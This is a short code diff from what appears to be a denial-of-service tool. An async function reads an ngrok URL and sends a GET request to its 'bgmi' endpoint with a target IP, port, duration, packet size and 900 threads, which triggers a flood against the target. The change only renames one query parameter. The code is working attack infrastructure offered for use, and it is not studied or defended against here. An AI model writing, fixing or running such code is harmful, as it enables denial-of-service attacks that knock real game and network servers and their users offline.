@@ -35,7 +35,7 @@ async def run_attack_command_async(target_ip, target_port, duration):
             with open(current_file, "r") as file:
                 ngrok_url = file.read().strip()
                 
-            url = f"{ngrok_url}/bgmi?ip={target_ip}&port={target_port}&time={duration}&packetsize=8&thread=900"
+            url = f"{ngrok_url}/bgmi?ip={target_ip}&port={target_port}&time={duration}&packet_size=8&thread=900"
             headers = {"ngrok-skip-browser-warning": "any_value"}
             response = requests.get(url, headers=headers)
             
